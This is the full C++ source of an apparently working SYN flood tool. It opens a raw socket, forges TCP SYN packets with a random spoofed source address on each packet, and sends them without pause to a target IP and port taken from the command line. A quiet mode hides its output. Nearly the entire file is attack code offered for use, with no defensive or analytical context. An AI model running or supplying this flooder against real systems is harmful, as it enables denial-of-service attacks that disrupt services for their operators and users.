#include <iostream>
#include <cstring>
#include <cstdlib>
#include <cstdio>
#include <ctime>
#include <unistd.h>
#include <arpa/inet.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <sys/socket.h>
#include <getopt.h>

#define PACKET_SIZE 4096

unsigned short csum(unsigned short *ptr, int nbytes) {
    long sum;
    unsigned short oddbyte;
    short answer;

    sum = 0;
    while(nbytes > 1) {
        sum += *ptr++;
        nbytes -= 2;
    }

    if(nbytes == 1) {
        oddbyte = 0;
        *((unsigned char*)&oddbyte) = *(unsigned char*)ptr;
        sum += oddbyte;
    }

    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >>16);
    answer = (short)~sum;

    return answer;
}

struct pseudo_header {
    u_int32_t source_address;
    u_int32_t dest_address;
    u_int8_t placeholder;
    u_int8_t protocol;
    u_int16_t tcp_length;
};

unsigned short tcp_checksum(struct iphdr *iph, struct tcphdr *tcph) {
    char buf[PACKET_SIZE];
    memset(buf, 0, PACKET_SIZE);

    struct pseudo_header psh;
    psh.source_address = iph->saddr;
    psh.dest_address = iph->daddr;
    psh.placeholder = 0;
    psh.protocol = IPPROTO_TCP;
    psh.tcp_length = htons(sizeof(struct tcphdr));

    memcpy(buf, &psh, sizeof(struct pseudo_header));
    memcpy(buf + sizeof(struct pseudo_header), tcph, sizeof(struct tcphdr));

    return csum((unsigned short*)buf, sizeof(struct pseudo_header) + sizeof(struct tcphdr));
}

in_addr_t random_ip() {
    in_addr_t ip;
    while(true) {
        ip = (rand() % 223 + 1) << 24 | (rand() % 256) << 16 | (rand() % 256) << 8 | (rand() % 256);
        unsigned char first_octet = (ip >> 24) & 0xFF;
        if (first_octet == 10 || first_octet == 127 || (first_octet >= 224 && first_octet <= 239))
            continue;
        break;
    }
    return htonl(ip);
}

void print_usage(const char* prog) {
    std::cout << "Usage:\n"
         << "  sudo " << prog << " --ip <target_ip> --port <target_port> [--usleep <microseconds>] [--quiet]\n"
         << "  or\n"
         << "  sudo " << prog << " <target_ip> <target_port> [<usleep_microseconds>] [--quiet]\n"
         << "\n"
         << "Options:\n"
         << "  --ip       Target IP address\n"
         << "  --port     Target port\n"
         << "  --usleep   Microseconds to sleep between packets (0 for no sleep)\n"
         << "  --quiet    Suppress output\n";
}

int main(int argc, char* argv[]) {
    std::string target_ip;
    int target_port = 0;
    int usleep_time = 0; // microseconds, default no sleep
    bool quiet_mode = false;

    static struct option long_options[] = {
        {"ip", required_argument, 0, 'i'},
        {"port", required_argument, 0, 'p'},
        {"usleep", required_argument, 0, 'u'},
        {"quiet", no_argument, 0, 'q'},
        {0, 0, 0, 0}
    };

    if (argc < 3) {
        print_usage(argv[0]);
        return 1;
    }

    int opt;
    int option_index = 0;
    while ((opt = getopt_long(argc, argv, "i:p:u:q", long_options, &option_index)) != -1) {
        switch(opt) {
            case 'i':
                target_ip = optarg;
                break;
            case 'p':
                target_port = atoi(optarg);
                break;
            case 'u':
                usleep_time = atoi(optarg);
                break;
            case 'q':
                quiet_mode = true;
                break;
            default:
                print_usage(argv[0]);
                return 1;
        }
    }

    // 如果沒用長參數設定 IP 和 port，嘗試位置參數
    if (target_ip.empty() || target_port == 0) {
        if (argc - optind >= 2) {
            target_ip = argv[optind];
            target_port = atoi(argv[optind + 1]);
            if (argc - optind >= 3) {
                // 可能是 usleep 或 --quiet，但 --quiet 不能位置參數帶，忽略
                usleep_time = atoi(argv[optind + 2]);
            }
        } else {
            print_usage(argv[0]);
            return 1;
        }
    }

    srand(time(NULL));

    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if(sock < 0) {
        perror("Socket creation failed");
        return 1;
    }

    int one = 1;
    if(setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
        perror("setsockopt");
        return 1;
    }

    char packet[PACKET_SIZE];
    struct sockaddr_in dest;
    dest.sin_family = AF_INET;
    dest.sin_port = htons(target_port);
    dest.sin_addr.s_addr = inet_addr(target_ip.c_str());

    if (!quiet_mode) {
        std::cout << "Starting SYN flood to " << target_ip << ":" << target_port
             << " with usleep = " << usleep_time << " microseconds" << std::endl;
    }

    while(true) {
        memset(packet, 0, PACKET_SIZE);

        struct iphdr *iph = (struct iphdr*)packet;
        iph->ihl = 5;
        iph->version = 4;
        iph->tos = 0;
        iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr));
        iph->id = htons(rand() % 65535);
        iph->frag_off = 0;
        iph->ttl = 64;
        iph->protocol = IPPROTO_TCP;
        iph->check = 0;
        iph->saddr = random_ip();
        iph->daddr = dest.sin_addr.s_addr;
        iph->check = csum((unsigned short*)iph, sizeof(struct iphdr));

        struct tcphdr *tcph = (struct tcphdr*)(packet + sizeof(struct iphdr));
        tcph->source = htons(rand() % 65535);
        tcph->dest = htons(target_port);
        tcph->seq = htonl(rand() % 4294967295);
        tcph->ack_seq = 0;
        tcph->doff = 5;
        tcph->fin = 0;
        tcph->syn = 1;
        tcph->rst = 0;
        tcph->psh = 0;
        tcph->ack = 0;
        tcph->urg = 0;
        tcph->window = htons(5840);
        tcph->check = 0;
        tcph->urg_ptr = 0;

        tcph->check = tcp_checksum(iph, tcph);

        int sent = sendto(sock, packet, ntohs(iph->tot_len), 0, (struct sockaddr*)&dest, sizeof(dest));
        if(sent < 0) {
            perror("sendto failed");
        } else if (!quiet_mode) {
            std::cout << "Sent SYN packet from IP: " << inet_ntoa(*(in_addr*)&iph->saddr)
                 << " to " << target_ip << ":" << target_port << std::endl;
        }

        if (usleep_time > 0) {
            usleep(usleep_time);
        }
    }

    close(sock);
    return 0;
}
